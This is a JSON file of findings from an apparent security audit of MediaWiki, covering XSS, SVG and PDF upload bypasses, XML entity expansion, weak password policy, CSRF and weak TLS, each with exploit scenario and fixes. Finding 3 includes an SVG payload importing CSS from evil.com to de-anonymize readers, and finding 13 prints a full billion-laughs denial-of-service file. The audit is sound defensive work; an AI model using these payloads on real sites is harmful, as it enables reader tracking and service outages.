{
  "report" : "Wikimedia.pdf",
  "finding_dict": {
"tstorg-wmf1214-8" : {
  "title": "reflected xss in api.php",
  "vulnClass": "data validation",
  "severity": "high",
  "difficulty": "low",
  "identifier": "tstorg-wmf1214-8",
  "targets": "the api endpoint, available at http://devwiki/w/api.php.",
  "description": "the api supports multiple data output formats, some of which have recently been deprecated. the wddx output format will return a response with content-type: text/xml . the response always indicates that the wddx output format has been deprecated and instructs the api user to use the json format instead. however, if an api request with this output format is sent to api.php with an invalid parameter, the response will also include an error message that reflects the user-supplied parameter without any output encoding. this allows an attacker to inject xml, which can be used to trick the browser into interpreting the response as xhtml and executing injected javascript. to exploit this vulnerability, an attacker can craft a simple url that, when clicked by a mediawiki user, will execute arbitrary javascript in their browser session for that domain.",
  "exploitScenario": "an attacker crafts a malicious link with javascript that attempts to assign administrative rights to their own user account. they insert the link on a mediawiki page and wait for an active administrator with the appropriate privileges to click it. when the administrator clicks the link, the javascript is reflected in the response, which results in the administrator's browser silently sending a request to grant administrator privilege to the attacker's mediawiki account. the attacker then uses this unauthorized privileged access to inspect user ip addresses or destroy content.",
  "shortTermSolution": "in this case, because the wddx format is deprecated, no user-supplied data needs to be reflected in the response at all. if there is a specific need to display this error data, including the user-supplied parameters, apply the same output encoding that is used when the xml output format is requested. review the code for similar issues where output-encoding has not been applied to a response.",
  "longTermSolution": "implement security regression tests that ensure that appropriate output encoding occurs for all user-supplied data. implement a content security policy (csp). csp is an http header that can control what types of active content (such as javascript, applets, and css) the browser will allow, based on how the content is presented. an optimally configured csp policy will never allow browsers to execute inline javascript, eval statements, or scripts in dom event attributes. this requires that all javascript is loaded explicitly from external sources with whitelisted urls. however, if inline scripts and event attributes are required in the meantime, the csp header can by used to transmit a nonce value with each source in the whitelist. this nonce must then be included as a script attribute and checked by the server. this helps prevent xss attacks. the csp specification can be found at https://w3c.github.io/webappsec/specs/content-security-policy/#usage-4."
},
"tstorg-wmf1214-3" : {
  "title": "External Reference in SVG Class: Data Validation Vulnerability",
  "vulnClass": "data validation",
  "severity": "High",
  "difficulty": "Low",
  "identifier": "tstorg-WMF1214-3",
  "targets": "The upload feature, available at http://devwiki/wiki/special:upload.",
  "description": "when uploading an svg file, it is possible to bypass the validation filters and upload an svg file that references a remote css file. the validation routines that prevent inclusion of remote css files perform checks in a case-sensitive manner and fails to block import and other case-variations. for example, the following style declaration within an svg file will cause any browser that renders the file to fetch http://evil.com/attack.css: <svg xmlns= \"http: // www .w3.org /2000/ svg \"> <style> @import 'http: // evil .com /attack .css ';</style> </svg> listing 1: specially-crafted svg file including a remote style sheet. this vulnerability can be exploited to de-anonymize mediawiki's readers. this can be used by malicious individuals or governments who will be able to identify the reader's location from their ip address, as well as the visited page from the referrer header.",
  "exploitScenario": "A Mediawiki user uploads a hostile SVG file that references a style sheet on an attacker-controlled webserver. The user then embeds this SVG file into the content of an article. By monitoring users that request the style sheet, the attacker can build a complete list of users that have viewed the article in question.",
  "shortTermSolution": "modify the regular expressions for validating svg file uploads to block the import keyword in a case-insensitive manner.",
  "longTermSolution": "examine all other validation expressions to ensure that case sensitivity is handled in a context-appropriate manner. implement a csp in order to limit passive content like images. this can be configured to prohibit callbacks to third parties on page loads, effectively preventing de-anonymization."
},
"tstorg-wmf1214-11" : {
  "title": "stored xss in uploaded svg files",
  "vulnClass": "Data Validation",
  "severity": "Medium",
  "difficulty": "Low",
  "identifier": "tstorg-WMF1214-11",
  "targets": "The upload feature, available at http://devwiki/wiki/special:upload.",
  "description": "when uploading an svg file, it is possible to bypass the validation filters and upload an svg file that executes javascript when rendered. the svg validation is a blacklist-based approach and contains protections against numerous techniques for embedding javascript in svg files; however, the protections against nested svg files are inadequate due to a missing mime type blacklist. specifically, data: uris with the image/svg or text/xml formats are blacklisted, but the application/xml mime type is sufficient to create a nested svg file with javascript code.",
  "exploitScenario": "an attacker crafts a malicious svg document that contains canned javascript exploit code and uploads it to a popular section on the mediawiki application. when the svg file is viewed, the victim's browser is fingerprinted and instructed to download appropriate exploit code from an attacker-controlled server. the attacker is able to compromise users who view the hostile svg file, and the attacker can expand their impact by hijacking the privileges of the victim users.",
  "shortTermSolution": "modify the svg validation blacklist filters to include the application/xml mime type. verify that no other mime types can be used to embed nested svg files.",
  "longTermSolution": "transition the svg validation logic to a whitelist-based approach."
},
"tstorg-wmf1214-13" : {
  "title": "entity expansion in svg and xmp metadata",
  "vulnClass": "Denial of Service",
  "severity": "Medium",
  "difficulty": "Low",
  "identifier": "tstorg-WMF1214-13",
  "targets": "XML parser of the upload feature at http://devwiki/wiki/special:upload",
  "description": "when uploading an svg file, or any file that includes xmp metadata, it is possible to include xml doctype declarations that trigger an xml entity expansion attack against the xml parser when the uploaded file is processed. this attack uses a series of expanding xml entities that, when fully expanded, can consume a large amount of memory . this causes the xml parser to consume all available resources on the system, leaving the webserver unresponsive. the billion laughs 6 attack is an example of such attack, which results in approximately 3gb of data to be processed. an example of a file that exploits this vulnerability is below: <? xml version =\"1.0 \" encoding= \"utf -8\" standalone =\"yes \"?> <! doctype svg [ <!entity lol \"lol \"> <! element lolz (# pcdata )> <! entity lol1 \"&lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;\"> <! entity lol2 \"&lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;\"> <! entity lol3 \"&lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;\"> <! entity lol4 \"&lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;\"> <! entity lol5 \"&lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;\"> <! entity lol6 \"&lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;\"> <! entity lol7 \"&lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;\"> <! entity lol8 \"&lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;\"> <! entity lol9 \"&lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;\"> ]> <svg> <lolz>& lol9 ;</lolz> </svg> listing 4: example of the billion laughs attack embedded in an svg file. this file will cause consumption of 3gb of memory when uploaded.",
  "exploitScenario": "a mediawiki user wishes to suppress information contained on wikimedia foundation's website during a sensitive election period. to accomplish this, the attacker uploads a hostile svg file containing the billion laughs attack. the attacker is able to bring the mediawiki application offline for an extended period during a critical timeframe.",
  "shortTermSolution": "determine if xml dtd support is necessary for the correct processing of uploaded files. disable dtd parsing if it is unnecessary.",
  "longTermSolution": "set limits on execution time and resource usage for all scripts that perform entity substitution on xml data."
},
"tstorg-wmf1214-1" : {
  "title": "lack of upper limit on password length allows dos",
  "vulnClass": "denial of service",
  "severity": "medium",
  "difficulty": "low",
  "identifier": "tstorg-wmf1214-1",
  "targets": "the login page, available at http://devwiki/w/index.php?title=special:userlogin.",
  "description": "the application does not have an upper limit on the length of a user-supplied password, which allows for arbitrarily large strings to be passed to the password hashing function. because passwords are hashed by default using pbkdf2+sha256 with a cost of 10,000, extremely large passwords can be used to consume large amounts of system resources, resulting in the site becoming unresponsive to other requests.",
  "exploitScenario": "an unauthenticated attacker writes a script that attempts to log into a user account with a very large password,e.g. 2-4mb in size. running this script repeatedly against wikimedia foundation endpoints could cause enough servers to consume their resources, causing the site to become unresponsive or inaccessible to legitimate users.",
  "shortTermSolution": "implement an upper limit for password strings-128 characters should be more than sufficient. enforce this limit before performing any further processing on user-supplied passwords.",
  "longTermSolution": "before performing any compression, decompression or hashing operation, ensure that user-supplied data meets basic sanity parameters in terms of size and length."
},
"tstorg-wmf1214-15" : {
  "title": "external reference in pdf",
  "vulnClass": "data validation",
  "severity": "medium",
  "difficulty": "medium",
  "identifier": "tstorg-wmf1214-15",
  "targets": "the upload feature, available at http://devwiki/wiki/special:upload.",
  "description": "pdf files can contain references to external content, such as images, audio, and video. loading external content from a pdf can be used to de-anonymize users who view the pdf directly using adobe reader or another pdf reader.",
  "exploitScenario": "an attacker wishes to determine who reads a specific wiki article. the attacker creates a pdf that loads content from an attacker-controlled server, using an existing pdf document related to the article as a base. a user interested in the topic opens the pdf for more information while reading the article and their pdf reader sends a request to the attacker's server, revealing their ip address, and by extension, their location.",
  "shortTermSolution": "provide a click-through warning informing users that pdf documents are active content that could potentially de-anonymize them when viewed directly",
  "longTermSolution": "convert uploaded pdfs to static images to avoid issues with active content. ensure the library used for conversion is robust as it will be parsing potentially malicious content on the server side, which could be a greater compromise than individual users. consider setting up a sandboxed environment."
},
"tstorg-wmf1214-14" : {
  "title": "stored xss in pdf files",
  "vulnClass": "data validation",
  "severity": "medium",
  "difficulty": "medium",
  "identifier": "tstorg-wmf1214-14",
  "targets": "the upload feature, available at http://devwiki/wiki/special:upload.",
  "description": "the pdf format allows for documents containing embedded javascript. during testing, a pdf that executes javascript when the document is opened was successfully uploaded. testing indicated that this feature only works in adobe reader, whereas other readers such as the pdf reader built into firefox and the pdf reader built into chrome do not support javascript actions. javascript could be used to de-anonymize a user or to attempt exploits against a user.",
  "exploitScenario": "an attacker wishes to determine who reads a specific wiki article. the attacker creates a pdf that uses javascript to make surreptitious http requests to an attacker-controlled server, using an existing pdf document related to the article as a base. a user interested in the topic opens the pdf for more information while reading the article and their pdf reader sends a request to the attacker, revealing their ip address, and by extension, their location.",
  "shortTermSolution": "provide a click-through warning informing users that pdf documents are active content that could potentially de-anonymize them when viewed directly",
  "longTermSolution": "convert uploaded pdfs to static images to avoid issues with active content. ensure the library used for conversion is robust as it will be parsing potentially malicious content on the server side, which could be a greater compromise than individual users. consider setting up a sandboxed environment."
},
"tstorg-wmf1214-10" : {
  "title": "Custom JavaScript May Yield Privilege Escalation",
  "vulnClass": "privilege escalation",
  "severity": "medium",
  "difficulty": "medium",
  "identifier": "tstorg-wmf1214-10",
  "targets": "users' custom scripts, such as http://devwiki/w/index.php?title=user:foo/common.js&action=submit",
  "description": "when editing any user's custom javascript, the script is executed whenever the 'show preview' or 'show changes' buttons are clicked. this could allow an attacker to trick another user into executing javascript which hijacks their session. because privileged users can edit the javascript of lower privileged users, this could lead to privilege escalation.",
  "exploitScenario": " a low-privileged user adds some complex custom javascript to their account, with malicious code embedded within that directs people to a fake login screen or performs actions on the victim's behalf. the user complains to an administrator that they are having difficulty with their custom 'skin' , and asks the administrator to change a small portion of the script for them. upon previewing the edit or viewing changes, the malicious code executes in the context of the administrator's session.",
  "shortTermSolution": "do not include another user's custom script when previewing or showing changes. These pages should only allow users to edit and view code.",
  "longTermSolution": "the custom javascript system has two security flaws (see finding 10 on page 27). Consider deprecating this functionality and allowing users to customize the site using client-side code instead."
},
"tstorg-wmf1214-2" : {
  "title": "Weak Password Policy",
  "vulnClass": "Configuration",
  "severity": "Medium",
  "difficulty": "High",
  "identifier": "tstorg-WMF1214-2",
  "targets": "The signup page, available at http://devwiki/w/index.php?title=special:userlogin&type=signup",
  "description": "wikimedia foundation does not enforce a strong password policy for the mediawiki application. upon account creation, a user can enter any password as long as the password is at least 1 character long and different than the user's username. the lack of password complexity requirements often results in a number of users choosing weak passwords, which increases the odds of an attacker to successfully guess user's passwords by performing a brute force or dictionary attack.",
  "exploitScenario": "An attacker makes a small list of very common passwords that likely to be used on Mediawiki, such as 'password' or 'wiki'. The attacker enumerates all usernames and tries to login with the weak passwords. Because of the large amount of users on Mediawiki, and the weak password policy, the success rate of the attack is high, giving the attacker mass account takeover.",
  "shortTermSolution": "implement and enforce a policy to require complex passwords. the following is an example of a complex password policy . passwords should: * be a minimum of eight characters long * contain at least one of each of the following: - an uppercase letter - a lowercase letter - a number - a special character * be different than a user's username * implement a blacklist of passwords that the user cannot use. (e.g., 123456, password, password123, qwerty1!, etc.)",
  "longTermSolution": "In addition to enforcing the use of strong passwords, Wikimedia Foundation should require all admins to authenticate using multi-factor authentication, with the option for non-privileged users to opt-in."
},
"tstorg-wmf1214-5" : {
  "title": "Lack of Registry Lock on Domain Names",
  "vulnClass": "Configuration",
  "severity": "Medium",
  "difficulty": "High",
  "identifier": "tstorg-WMF1214-5",
  "targets": "The DNS configuration of wikimedia.org, wikipedia.org and mediawiki.org.",
  "description": " there is no dns registry lock on the various domains of the wikimedia foundation. test organization performed dns whois queries on the target domains and observed that while flags are in place to prevent client transfers, no registry locks are set up to prohibit server transfers. this could allow for a malicious or compromised registrar 7 to transfer the domain to malicious hosts. the following listing displays the whois records for wikipedia.org. it has been stripped out of the contact information. visit http://www.whois.com/whois/wikipedia.org to query up-to-date records. domain status : clientdeleteprohibited domain status : clienttransferprohibited domain status : clientupdateprohibited name server :ns0 .wikimedia .org name server :ns1 .wikimedia .org name server :ns2 .wikimedia .org dnssec :unsigned listing 5: whois records for wikipedia.org.",
  "exploitScenario": "An attacker finds a vulnerability on WMF's registrar and is able to compromise it. The attacker modifies the DNS records of all WMF domains and subdomains and redirects all traffic to their own servers. Because emails are relying on the DNS records, internal WMF communications are also sabotaged, which slows down investigation of the issue.",
  "shortTermSolution": "Add a registry lock on all WMF domains by adding the following DNS flags: Domain status : ServerDeleteProhibited; Domain status : ServerTransferProhibited; Domain status : ServerUpdateProhibited.",
  "longTermSolution": "Consider setting up a backup communication channel that does not depend on WMF domains to avoid interruption in the event of a failure or compromise of the DNS infrastructure of WMF."
},
"tstorg-wmf1214-7" : {
  "title": "Users can inspect each other's personal JavaScript",
  "vulnClass": "data exposure",
  "severity": "low",
  "difficulty": "low",
  "identifier": "tstorg-wmf1214-7",
  "targets": "http://devwiki/w/index.php?title=user:admin/common.js http://devwiki/w/load.php?debug=false&lang=en&modules=user&only=scripts&skin=vector&user=admin http://devwiki/wiki/user:admin/(skinname).js",
  "description": "MediaWiki allows users to upload custom JavaScript and CSS to alter the interface and functionality of the system. This code is stored as a wiki page and is visible to any user of the system.",
  "exploitScenario": "A user uploads JavaScript containing personal information that may de-anonymize that user. Another user can change the username in one of the above URLs to view the victim's custom code, learning information that may be used to identify the owner of the custom code.",
  "shortTermSolution": "Treat custom script the same as other user preferences by disallowing users from examining these customizations unless they are associated with the logged-in account.",
  "longTermSolution": "The custom JavaScript system has two security flaws. Consider deprecating this functionality and allowing users to customize the site using client-side code instead."
},
"tstorg-wmf1214-6" : {
  "title": "check user page lacks cross site request forgery (csrf) protection",
  "vulnClass": "data validation",
  "severity": "low",
  "difficulty": "medium",
  "identifier": "tstorg-wmf1214-6",
  "targets": "the check user page located at http://devwiki/wiki/special:checkuser.",
  "description": "the process to check a corresponding username to ip address and vice versa lacks csrf protection. csrf attacks are perpetrated by issuing a request to a protected resource within a web application on behalf of a user without their knowledge. when the server receives the requests, it has no way of distinguishing the forged request from a request sent purposefully by the user. any user with basic rights on mediawiki can trick a user with check user rights into submitting multiple look up requests. this will fill the check user log with untrustworthy data.",
  "exploitScenario": "an attacker with basic user rights on mediawiki makes targeted attacks towards mediawiki users with check user rights. a user with check user rights is tricked into visiting a site the attacker controls, in turn tricking their browser into sending the request that submits unnecessary check user requests. although the attacker cannot view the responses, a large number of unnecessary requests can damage the reputation of the valid user.",
  "shortTermSolution": "require a valid wpedittoken to be submitted with each check user request.",
  "longTermSolution": "ensure that this wpedittoken is included with all state-changing requests site-wide. additionally, update the api such that if this token is not present, the user cannot make any state changing requests."
},
"tstorg-wmf1214-12" : {
  "title": "user access roles are public",
  "vulnClass": "data exposure ",
  "severity": "informational",
  "difficulty": "low",
  "identifier": "tstorg-wmf1214-12",
  "targets": "the following pages: * http://devwiki/codwiki/index.php/special:activeusers * http://devwiki/codwiki/index.php/special:globalusers * http://devwiki/codwiki/index.php/special:centralauth",
  "description": "the target links allow unauthenticated users to look up privileges associated with roles, and the role associated with any existing user. the roles, such as ``administrator'' or ``steward'' , disclose the list of operations a specific user has permission to perform. an attacker can use this information to enumerate users with higher privileges and create targeted attacks against them.",
  "exploitScenario": null,
  "shortTermSolution": "do not show the user roles in the list of users to unauthenticated users while displaying the list of users. restrict the global account information to the privileged users only ",
  "longTermSolution": "make a chart of what parts of user accounts are considered private or protected, and go through each way of accessing user data and make sure it conforms to specifications. perform regression checks to verify that there is no information disclosure which can be useful to the attacker."
},
"tstorg-wmf1214-4" : {
  "title": "RC4 Cipher Enabled",
  "vulnClass": "configuration",
  "severity": "Informational",
  "difficulty": "High",
  "identifier": "tstorg-WMF1214-4",
  "targets": "The TLS configuration of WMF servers, such as https://www.mediawiki.org.",
  "description": "The RC4-SHA cipher is enabled in the SSL/TLS configuration of WMF's servers. RC4 is a stream cipher that is often preferred by TLS servers due to its speed; however, security researchers recently demonstrated that this cipher is not suitable to guarantee message confidentiality . The RC4 cipher is flawed in its generation of a pseudo-random stream of bytes so that a wide variety of small biases are introduced into the stream, decreasing its randomness thus creating potential for plaintext recovery attacks. An advisory from the IETF, released October 2013, has noted that recent improvements in the attack vectors on RC4 mean that they are on the verge of becoming practically exploitable. As such, the IETF advises that RC4 can no longer be seen as providing sufficient levels of security for TLS sessions. The advisory goes on to require that TLS clients and servers never negotiate the use of RC4 cipher suites. Because of the deficiencies noted, the IETF advisory, referenced below, states that: * TLS clients must not include RC4 cipher suites in the clienthello message.* TLS servers must not select an RC4 cipher suite when a TLS client sends such a cipher suite in the clienthello message.",
  "exploitScenario": null,
  "shortTermSolution": "remove rc4 from production environments. update the ssl/tls configuration to only allow cryptographically strong cipher suites. refer to https://wiki.mozilla.org/security/ server_side_tls for the latest recommended cipher suite configurations. this list should prefer cipher suites that provide perfect forward secrecy, such as those using elliptic curve diffie-hellman (ecdhe).",
  "longTermSolution": "Stay abreast of security community news, such that new SSL/TLS attacks or configuration weaknesses can be immediately patched or remedied. Regularly check web server SSL/TLS configuration using tools like SSlyze10 or SSL Labs.14 Keep cipher suite configurations current with the latest recommended configurations found on the Mozilla wiki."
}}
}
